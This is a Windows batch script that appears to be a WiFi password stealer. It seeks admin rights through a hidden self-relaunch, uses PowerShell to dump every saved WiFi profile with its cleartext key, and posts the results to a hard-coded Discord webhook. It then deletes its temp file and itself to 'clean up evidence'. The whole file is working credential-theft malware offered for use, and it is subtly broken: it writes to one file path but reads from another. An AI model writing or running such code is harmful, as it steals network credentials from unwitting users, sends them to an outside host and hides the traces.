@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    REM Extract WiFi credentials
    set filepath=%TEMP%\wifi_creds_%random%.txt
    
    REM Get system info and WiFi credentials
    powershell -WindowStyle Hidden -Command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content'); if($pass) {$passValue = ($pass -split ':')[1].Trim()} else {$passValue = 'No password or access denied'}; Write-Output \"$name : $passValue\"} | Out-File C:\wifi_credentials.txt -Encoding utf8"
    
    REM Wait a moment for file to be written
    timeout /t 2 /nobreak >nul
    
    REM Send to Discord webhook
    powershell -Command "try { $content = Get-Content '%filepath%' -Raw; if(!$content) { $content = 'Error: No data extracted' }; if($content.Length -gt 1800) { $content = $content.Substring(0,1800) + '... (truncated)' }; $json = @{ content = '**WiFi Credentials Captured!**' + [char]0x0060 + [char]0x0060 + [char]0x0060 + $content + [char]0x0060 + [char]0x0060 + [char]0x0060 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1429765407006527538/ZvNQHk-1RsSEN0u12m6LZtSOqm3cIgeKBs5I5Y4rE57XI94dmdYLyKBXJKKM9XGR_uWK' -Method Post -Body $json -ContentType 'application/json; charset=utf-8' } catch { }"
    
    REM Clean up evidence
    timeout /t 1 /nobreak >nul
    del "%filepath%" /q 2>nul
    del "%~f0" /q 2>nul
    exit /b
) else (
    REM Request admin privileges
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
